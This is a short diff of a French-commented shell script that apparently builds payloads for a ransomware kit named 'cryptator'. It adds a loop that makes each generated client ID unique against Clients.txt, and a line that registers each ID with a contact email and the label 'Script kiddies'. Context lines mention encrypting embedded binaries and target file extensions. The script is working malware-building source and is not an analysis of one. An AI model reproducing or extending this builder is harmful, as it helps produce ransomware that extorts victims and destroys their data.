@@ -23,11 +23,18 @@ EXTENTIONS="exe pdf jpg png mp4"
 echo "Nettoyage ..."
 rm -f cryptator.7z jpg.7z png.7z pdf.7z mp4.7z
 
-echo "Génaration d'un ID unique aléatoire"
-UNIQUEID=`echo $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM | md5sum - | tr '[:lower:]' '[:upper:]' | cut -c1-8`
+echo "Génaration d'un ID unique aléatoire "
+UNIQUE=0
+while [ ${UNIQUE} -eq 0 ]
+do
+  UNIQUEID=`echo $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM | md5sum - | tr '[:lower:]' '[:upper:]' | cut -c1-8`
+  grep "${UNIQUEID}" ${WORKDIR}/Clients.txt >/dev/null 2>&1
+  UNIQUE=$?
+done
 echo " >>> Génération : ${UNIQUEID}"
 OUTPUTDIR=${WORKDIR}/outfile/${UNIQUEID}
 echo "${UNIQUEID}" > ${TEMPDIR}/client.id
+echo "${UNIQUEID}:ChangeMyEmail@edgtslfcbngq6sk.space:Script kiddies" >> ${WORKDIR}/Clients.txt
 echo
 
 echo "Chiffrement des binaires embarqués"
